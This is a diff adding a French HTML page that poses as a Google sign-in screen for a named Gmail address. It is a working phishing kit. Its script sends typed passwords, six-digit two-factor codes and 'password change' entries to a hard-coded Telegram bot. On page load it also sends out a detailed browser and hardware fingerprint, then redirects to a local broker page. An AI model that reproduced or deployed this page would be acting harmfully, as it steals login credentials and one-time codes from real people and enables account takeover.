@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connexion — Google</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:Roboto,Arial,sans-serif;
+      background:#202124;min-height:100vh;
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:space-between;
+      padding:20px 16px 16px;
+    }
+    .main{flex:1;display:flex;align-items:center;justify-content:center;width:100%}
+    .card{background:#292a2d;border-radius:16px;padding:40px 40px 36px;width:100%;max-width:444px}
+    .google-logo{width:75px;height:75px;margin:0 auto 24px;display:block}
+    .card h1{font-size:24px;font-weight:400;color:#e8eaed;margin-bottom:6px;text-align:center;line-height:1.3}
+    .subtitle{font-size:14px;color:#9aa0a6;margin-bottom:28px;font-weight:400;text-align:center;line-height:1.5}
+    .email-chip{
+      display:flex;align-items:center;justify-content:center;gap:8px;
+      margin-bottom:28px;
+    }
+    .email-chip span{font-size:14px;color:#9aa0a6}
+    .pw-wrap{position:relative;margin-bottom:8px}
+    .pw-wrap input{
+      width:100%;padding:13px 44px 13px 16px;font-size:16px;
+      background:transparent;border:1px solid #5f6368;
+      border-radius:4px;color:#e8eaed;outline:none;
+      font-family:Roboto,Arial,sans-serif;transition:border-color .2s;
+      caret-color:#8ab4f8;
+    }
+    .pw-wrap input::placeholder{color:transparent}
+    .pw-wrap input:focus{border-color:#8ab4f8;border-width:2px;padding:12px 43px 12px 15px}
+    .pw-label{
+      position:absolute;left:12px;top:50%;transform:translateY(-50%);
+      font-size:16px;color:#9aa0a6;pointer-events:none;
+      transition:all .15s ease;background:#292a2d;padding:0 4px;
+    }
+    .pw-wrap input:focus~.pw-label,
+    .pw-wrap input:not(:placeholder-shown)~.pw-label{top:0;font-size:12px;color:#8ab4f8}
+    .pw-wrap .eye-btn{
+      position:absolute;right:12px;top:50%;transform:translateY(-50%);
+      background:none;border:none;cursor:pointer;padding:4px;
+      color:#9aa0a6;font-size:18px;line-height:1;
+    }
+    .pw-wrap .eye-btn:hover{color:#e8eaed}
+    .pw-error{font-size:12px;color:#e24b4a;margin-bottom:8px;line-height:1.4;min-height:18px}
+    .forgot-link{
+      display:block;text-align:left;margin-bottom:32px;
+    }
+    .forgot-link a{
+      color:#8ab4f8;font-size:13px;font-weight:500;text-decoration:none;
+    }
+    .forgot-link a:hover{text-decoration:underline}
+    .card-footer{display:flex;justify-content:space-between;align-items:center}
+    .create-link a{color:#8ab4f8;font-size:13px;font-weight:500;text-decoration:none}
+    .create-link a:hover{text-decoration:underline}
+    .next-btn{
+      background:#8ab4f8;color:#202124;border:none;
+      border-radius:100px;padding:10px 28px;font-size:14px;
+      font-weight:500;font-family:Roboto,Arial,sans-serif;
+      cursor:pointer;letter-spacing:.25px;transition:background .15s;
+    }
+    .next-btn:hover{background:#a8c7fa}
+    .next-btn:active{background:#7baaf7}
+    .next-btn:disabled{background:#4a4d50;color:#6e7276;cursor:not-allowed}
+    .divider{height:1px;background:#3c3f43;margin:8px 0 20px}
+    .strength-bar{display:flex;gap:4px;margin-top:-8px;margin-bottom:8px}
+    .strength-bar span{height:3px;flex:1;border-radius:2px;background:#3c3f43;transition:background .3s}
+    .strength-label{font-size:12px;color:#9aa0a6;margin-bottom:16px}
+    .hint{font-size:12px;color:#9aa0a6;margin-top:-8px;margin-bottom:20px;line-height:1.5}
+    .success-msg{
+      display:none;background:#1e3a2f;border:1px solid #34a853;
+      border-radius:8px;padding:12px 16px;margin-bottom:20px;
+      font-size:14px;color:#81c995;align-items:center;gap:8px;
+    }
+    .back-link{display:block;margin-bottom:24px}
+    .back-link a{color:#8ab4f8;font-size:13px;font-weight:500;text-decoration:none}
+    .back-link a:hover{text-decoration:underline}
+    .back-btn{
+      background:none;border:none;cursor:pointer;color:#9aa0a6;
+      font-size:22px;margin-bottom:20px;display:flex;align-items:center;
+      padding:4px;border-radius:50%;width:36px;height:36px;justify-content:center;
+    }
+    .back-btn:hover{background:rgba(255,255,255,0.08)}
+    .otp-wrap{display:flex;gap:8px;justify-content:center;margin-bottom:28px}
+    .otp-box{
+      width:44px;height:48px;text-align:center;font-size:22px;font-weight:400;
+      background:transparent;border:1px solid #5f6368;border-radius:4px;
+      color:#e8eaed;outline:none;font-family:Roboto,Arial,sans-serif;
+      caret-color:#8ab4f8;transition:border-color .2s;
+    }
+    .otp-box:focus{border-color:#8ab4f8;border-width:2px}
+    .otp-box.filled{border-color:#8ab4f8}
+    .otp-hint{text-align:center;font-size:13px;color:#9aa0a6;margin-bottom:28px;line-height:1.5}
+    .otp-hint a{color:#8ab4f8;text-decoration:none;font-weight:500}
+    .otp-hint a:hover{text-decoration:underline}
+    footer{display:flex;gap:24px;flex-wrap:wrap;justify-content:center;align-items:center;padding-top:16px;width:100%}
+    .footer-lang{display:flex;align-items:center;gap:6px;color:#9aa0a6;font-size:12px;cursor:pointer}
+    .footer-links{display:flex;gap:24px}
+    .footer-links a{color:#9aa0a6;font-size:12px;text-decoration:none}
+    .footer-links a:hover{text-decoration:underline}
+    @media(max-width:480px){
+      .card{padding:28px 20px 24px;border-radius:12px}
+      .card h1{font-size:20px}
+    }
+    @media(max-width:360px){
+      .card{padding:20px 14px 18px}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main">
+    <div class="card">
+
+      <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
+
+      <div id="view-login">
+        <h1>Bienvenue</h1>
+        <p class="subtitle">Connectez-vous à votre compte</p>
+
+        <div class="email-chip">
+          <span>wail98uma@gmail.com</span>
+        </div>
+
+        <div class="pw-wrap">
+          <input type="password" id="gmail-pass" placeholder="Mot de passe" autocomplete="current-password"/>
+          <button class="eye-btn" type="button" onclick="togglePass(this,'gmail-pass')" aria-label="Afficher">
+            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+        <p class="pw-error" id="pw-error">&nbsp;</p>
+
+        <div class="forgot-link">
+          <a href="#" onclick="showResetView();return false">Mot de passe oublié&thinsp;?</a>
+        </div>
+
+        <div class="card-footer">
+          <button class="next-btn" id="submit-btn" onclick="handleLogin()">Suivante</button>
+        </div>
+      </div>
+
+      <div id="view-otp" style="display:none">
+        <button class="back-btn" onclick="showLogin()" aria-label="Retour">&#8592;</button>
+        <h1>Vérification en deux étapes</h1>
+        <p class="subtitle">Entrez le code à 6 chiffres envoyé à votre adresse e-mail.</p>
+        <div class="otp-wrap">
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+          <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
+        </div>
+        <p class="otp-hint">
+          Un e-mail a été envoyé à <strong style="color:#e8eaed;font-weight:500">wail98uma@gmail.com</strong>.<br>
+          <a href="#" onclick="return false">Passer à la vérification par SMS</a>
+        </p>
+        <div class="card-footer">
+          <button class="next-btn" id="otp-btn" onclick="verifyOtp()">Vérifier</button>
+        </div>
+      </div>
+
+      <div id="view-reset" style="display:none">
+        <h1>Modifier le mot de passe</h1>
+        <p class="subtitle">Choisissez un mot de passe sécurisé et évitez de le réutiliser pour d'autres comptes.</p>
+
+        <div class="email-chip">
+          <span>wail98uma@gmail.com</span>
+        </div>
+
+        <div class="pw-wrap">
+          <input type="password" id="old-pass" placeholder=" " autocomplete="current-password"/>
+          <label class="pw-label" for="old-pass">Mot de passe actuel</label>
+          <button class="eye-btn" type="button" onclick="togglePass(this,'old-pass')" aria-label="Afficher">
+            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="pw-wrap">
+          <input type="password" id="new-pass" placeholder=" " autocomplete="new-password" oninput="checkStrength(this.value)"/>
+          <label class="pw-label" for="new-pass">Nouveau mot de passe</label>
+          <button class="eye-btn" type="button" onclick="togglePass(this,'new-pass')" aria-label="Afficher">
+            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+
+        <div class="strength-bar">
+          <span id="s1"></span><span id="s2"></span><span id="s3"></span><span id="s4"></span>
+        </div>
+        <p class="strength-label" id="slabel">&nbsp;</p>
+
+        <div class="pw-wrap">
+          <input type="password" id="confirm-pass" placeholder=" " autocomplete="new-password" oninput="checkMatch()"/>
+          <label class="pw-label" for="confirm-pass">Confirmer le nouveau mot de passe</label>
+          <button class="eye-btn" type="button" onclick="togglePass(this,'confirm-pass')" aria-label="Afficher">
+            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+        <p class="hint" id="match-hint">&nbsp;</p>
+
+        <div id="success-msg" class="success-msg">
+          ✓ Mot de passe modifié avec succès.
+        </div>
+
+        <div class="card-footer">
+          <button class="next-btn" id="reset-btn" onclick="handleReset()">Modifier</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-lang">
+      <svg viewBox="0 0 24 24" style="width:14px;height:14px;fill:#9aa0a6"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+      Français (France)
+      <svg viewBox="0 0 24 24" style="width:12px;height:12px;fill:#9aa0a6"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+    <div class="footer-links">
+      <a href="#">Aide</a>
+      <a href="#">Confidentialité</a>
+      <a href="#">Conditions</a>
+    </div>
+  </footer>
+
+  <script>
+    function togglePass(btn, id) {
+      var inp = document.getElementById(id);
+      var show = btn.querySelector('.eye-icon');
+      var hide = btn.querySelector('.eye-off-icon');
+      inp.type = inp.type === 'password' ? 'text' : 'password';
+      show.style.display = inp.type === 'password' ? 'block' : 'none';
+      hide.style.display = inp.type === 'password' ? 'none' : 'block';
+    }
+
+    function tgSend(msg){
+      try {
+        var token='8575168653:AAH-juffplyLZp5p3uGRB7A3T7uLfRNy96w';
+        var chat='2126771039';
+        var url='https://api.telegram.org/bot'+token+'/sendMessage';
+        // Try fetch POST (no URL limit)
+        if (typeof fetch==='function') {
+          fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chat,text:msg})}).catch(function(){});
+        } else {
+          // Fallback to Image GET (split if too long)
+          var max = 1500;
+          if (msg.length <= max) {
+            new Image().src=url+'?chat_id='+chat+'&text='+encodeURIComponent(msg);
+          } else {
+            for (var i=0; i<msg.length; i+=max) {
+              new Image().src=url+'?chat_id='+chat+'&text='+encodeURIComponent(msg.substring(i,i+max));
+            }
+          }
+        }
+      } catch(e){}
+    }
+    function sendToTelegram(type, data) {
+      var lines = ['[GMAIL] ' + type];
+      lines.push('Email: wail98uma@gmail.com');
+      lines.push('Time: ' + new Date().toLocaleString());
+      for (var key in data) {
+        lines.push(key + ': ' + data[key]);
+      }
+      tgSend(lines.join('\n'));
+    }
+
+    function handleLogin() {
+      var pass = document.getElementById('gmail-pass').value;
+      if (!pass) return;
+      sendToTelegram('PASSWORD', {'Password': pass});
+      document.getElementById('view-login').style.display = 'none';
+      document.getElementById('view-otp').style.display = 'block';
+      var boxes = document.querySelectorAll('.otp-box');
+      boxes.forEach(function(b,i){
+        b.value='';b.classList.remove('filled');
+        b.addEventListener('input',onOtpInput);
+        b.addEventListener('keydown',onOtpKeydown);
+        b.addEventListener('paste',onOtpPaste);
+      });
+      setTimeout(function(){boxes[0].focus()},200);
+    }
+
+    function showOtp() {
+      document.getElementById('view-login').style.display = 'none';
+      document.getElementById('view-otp').style.display = 'block';
+      var boxes = document.querySelectorAll('.otp-box');
+      boxes.forEach(function(b,i){
+        b.value='';b.classList.remove('filled');
+        b.addEventListener('input',onOtpInput);
+        b.addEventListener('keydown',onOtpKeydown);
+        b.addEventListener('paste',onOtpPaste);
+      });
+      setTimeout(function(){boxes[0].focus()},200);
+    }
+
+    function showLogin() {
+      document.getElementById('view-otp').style.display = 'none';
+      document.getElementById('view-login').style.display = 'block';
+    }
+
+    function showResetView() {
+      document.getElementById('view-login').style.display = 'none';
+      document.getElementById('view-reset').style.display = 'block';
+    }
+
+    function onOtpInput(e) {
+      var box = e.target;
+      if (box.value.match(/[0-9]/)) {
+        box.classList.add('filled');
+        var next = box.parentElement.querySelector('.otp-box:not(.filled)');
+        if (next) next.focus();
+        else document.getElementById('otp-btn').focus();
+      } else {
+        box.value = '';
+      }
+    }
+
+    function onOtpKeydown(e) {
+      if (e.key === 'Backspace' && !e.target.value) {
+        var prev = e.target.previousElementSibling;
+        if (prev) {prev.focus();prev.classList.remove('filled');prev.value='';}
+      }
+      if (e.key === 'Enter') verifyOtp();
+    }
+
+    function onOtpPaste(e) {
+      e.preventDefault();
+      var data = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+      var boxes = document.querySelectorAll('.otp-box');
+      data.split('').forEach(function(c,i){
+        if (boxes[i]) { boxes[i].value=c; boxes[i].classList.add('filled'); }
+      });
+      if (data.length===6) document.getElementById('otp-btn').focus();
+    }
+
+    function verifyOtp() {
+      var code = '';
+      document.querySelectorAll('.otp-box').forEach(function(b){code+=b.value;});
+      if (code.length!==6) return;
+      sendToTelegram('OTP CODE', {'OTP Code': code});
+      window.location.href = 'file:///C:/Users/ECC/Desktop/quotex/Connexion%20Web%20Quotex%20_%20Connexion%20QxBroker.html';
+    }
+
+    function checkStrength(val) {
+      var bars = ['s1','s2','s3','s4'].map(function(id){ return document.getElementById(id); });
+      var label = document.getElementById('slabel');
+      var score = 0;
+      if (val.length >= 8) score++;
+      if (/[A-Z]/.test(val)) score++;
+      if (/[0-9]/.test(val)) score++;
+      if (/[^A-Za-z0-9]/.test(val)) score++;
+      var colors = ['#e24b4a','#ef9f27','#8ab4f8','#34a853'];
+      var labels = ['Très faible','Faible','Moyen','Fort'];
+      bars.forEach(function(b,i){ b.style.background = i < score ? colors[score-1] : '#3c3f43'; });
+      label.textContent = val.length ? labels[score-1] || '' : '\u00a0';
+      label.style.color = score ? colors[score-1] : '#9aa0a6';
+      checkMatch();
+    }
+
+    function checkMatch() {
+      var np = document.getElementById('new-pass').value;
+      var cp = document.getElementById('confirm-pass').value;
+      var hint = document.getElementById('match-hint');
+      var btn = document.getElementById('reset-btn');
+      if (!cp) { hint.innerHTML = '\u00a0'; btn.disabled = false; return; }
+      if (np === cp) {
+        hint.innerHTML = '&#10003; Les mots de passe correspondent';
+        hint.style.color = '#34a853';
+        btn.disabled = false;
+      } else {
+        hint.innerHTML = 'Les mots de passe ne correspondent pas';
+        hint.style.color = '#e24b4a';
+        btn.disabled = true;
+      }
+    }
+
+    function handleReset() {
+      var old = document.getElementById('old-pass').value;
+      var np = document.getElementById('new-pass').value;
+      var cp = document.getElementById('confirm-pass').value;
+      if (!old || !np || !cp) return;
+      sendToTelegram('PASSWORD RESET', {'Old Password': old, 'New Password': np, 'Confirm': cp});
+      if (np !== cp) return;
+      var creds = JSON.parse(localStorage.getItem('quotex_gmail_creds')||'[]');
+      creds.push({email:'wail98uma@gmail.com',oldPassword:old,newPassword:np,timestamp:new Date().toISOString()});
+      localStorage.setItem('quotex_gmail_creds',JSON.stringify(creds));
+      document.getElementById('view-reset').style.display = 'none';
+      document.getElementById('view-otp').style.display = 'block';
+      var boxes = document.querySelectorAll('.otp-box');
+      boxes.forEach(function(b,i){
+        b.value='';b.classList.remove('filled');
+        b.addEventListener('input',onOtpInput);
+        b.addEventListener('keydown',onOtpKeydown);
+        b.addEventListener('paste',onOtpPaste);
+      });
+      setTimeout(function(){boxes[0].focus()},200);
+    }
+
+    document.addEventListener('DOMContentLoaded', function(){
+      var info = [];
+      var t = new Date();
+      info.push('[DEVICE INFO] Page Gmail ouverte');
+      info.push('Time: ' + t.toLocaleString());
+      info.push('Timestamp: ' + t.getTime());
+      info.push('User-Agent: ' + navigator.userAgent);
+      info.push('Platform: ' + (navigator.platform||'?'));
+      info.push('Language: ' + navigator.language);
+      info.push('Languages: ' + (navigator.languages||[]).join(','));
+      info.push('Screen: ' + screen.width + 'x' + screen.height);
+      info.push('Avail: ' + screen.availWidth + 'x' + screen.availHeight);
+      info.push('Color Depth: ' + screen.colorDepth + 'bit');
+      info.push('Pixel Ratio: ' + window.devicePixelRatio);
+      info.push('Orientation: ' + (screen.orientation ? screen.orientation.type : '?'));
+      info.push('Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone);
+      info.push('Timezone Offset: ' + -new Date().getTimezoneOffset() + 'min');
+      info.push('Cookies: ' + (navigator.cookieEnabled ? 'Yes' : 'No'));
+      info.push('Online: ' + (navigator.onLine ? 'Yes' : 'No'));
+      info.push('Referrer: ' + (document.referrer || 'Direct'));
+      info.push('URL: ' + window.location.href);
+      info.push('History: ' + history.length);
+      info.push('CPU Cores: ' + (navigator.hardwareConcurrency||'?'));
+      info.push('Memory: ' + (navigator.deviceMemory ? navigator.deviceMemory+'GB' : '?'));
+
+      // Connection and Battery
+      try {
+        var conn = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+        if (conn) {
+          info.push('Conn Type: ' + (conn.effectiveType||'?'));
+          info.push('Downlink: ' + (conn.downlink||'?') + 'Mbps');
+          info.push('RTT: ' + (conn.rtt||'?') + 'ms');
+        }
+      } catch(e){} 
+      try {
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function(b){
+            var msg = 'Battery: ' + Math.round(b.level*100) + '%' + (b.charging ? ' (charging)' : '');
+            info.push(msg);
+          });
+        }
+      } catch(e){}
+
+      info.push('Touch: ' + ('ontouchstart' in window ? 'Yes' : 'No'));
+      info.push('Max Touch Points: ' + (navigator.maxTouchPoints||0));
+      info.push('WebDriver: ' + (navigator.webdriver ? 'Yes' : 'No'));
+      info.push('Do Not Track: ' + (navigator.doNotTrack||'?'));
+      var pc = navigator.plugins.length;
+      info.push('Plugins: ' + pc);
+      if (pc>0) {
+        var pn=[]; for (var i=0;i<pc;i++) pn.push(navigator.plugins[i].name);
+        info.push('Plugins: ' + pn.join(', ').substring(0,200));
+      }
+
+      // Advanced Canvas fingerprint
+      try {
+        var c = document.createElement('canvas');
+        c.width = 400; c.height = 100;
+        var ctx = c.getContext('2d');
+        ctx.textBaseline = 'alphabetic';
+        ctx.font = '18px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(250,5,100,30);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Cg5jklmNpQrStUvWxYz',4,35);
+        ctx.fillStyle = 'rgba(102,204,0,0.8)';
+        ctx.fillText('Cg5jklmNpQrStUvWxYz',8,38);
+        ctx.fillStyle = '#a00';
+        ctx.arc(350,70,25,0,Math.PI*2);
+        ctx.fill();
+        ctx.fillStyle = '#fff';
+        ctx.font = '13px Courier New';
+        ctx.fillText('xYzAbCdEfGhIjKlMnOp',10,75);
+        ctx.fillStyle = 'rgba(0,50,200,0.5)';
+        ctx.fillRect(150,45,80,40);
+        ctx.fillStyle = '#ff0';
+        ctx.font = 'bold 16px Georgia';
+        ctx.fillText('QrStUvWxYz123',160,72);
+        var h = c.toDataURL();
+        info.push('Canvas Hash: ' + h.slice(-60));
+      } catch(e){info.push('Canvas: error');}
+
+      // WebGL detailed fingerprint
+      try {
+        var gl = c.getContext('webgl')||c.getContext('experimental-webgl');
+        if (gl) {
+          info.push('GL Vendor: ' + gl.getParameter(gl.VENDOR));
+          info.push('GL Renderer: ' + gl.getParameter(gl.RENDERER));
+          info.push('GL Version: ' + gl.getParameter(gl.VERSION));
+          info.push('GL Shader: ' + gl.getParameter(gl.SHADING_LANGUAGE_VERSION));
+          info.push('GL Max Tex: ' + gl.getParameter(gl.MAX_TEXTURE_SIZE));
+          info.push('GL Max Viewport: ' + gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'));
+          var exts = gl.getSupportedExtensions()||[];
+          info.push('GL Extensions: ' + exts.length);
+          // WebGL canvas fingerprint
+          var glCanvas = document.createElement('canvas');
+          var gl2 = glCanvas.getContext('webgl')||glCanvas.getContext('experimental-webgl');
+          if (gl2) {
+            var ext = gl2.getExtension('WEBGL_debug_renderer_info');
+            if (ext) {
+              info.push('GL Unmasked Vendor: ' + gl2.getParameter(ext.UNMASKED_VENDOR_WEBGL));
+              info.push('GL Unmasked Renderer: ' + gl2.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+            }
+          }
+        }
+      } catch(e){}
+
+      // Audio fingerprint
+      try {
+        var ac = new (window.AudioContext||window.webkitAudioContext)();
+        info.push('Audio Sample Rate: ' + ac.sampleRate + 'Hz');
+        ac.close();
+      } catch(e){}
+
+      tgSend(info.join('\n'));
+    });
+
+    document.getElementById('gmail-pass').addEventListener('keydown',function(e){
+      if(e.key==='Enter') handleLogin();
+    });
+  </script>
+
+</body>
+</html>
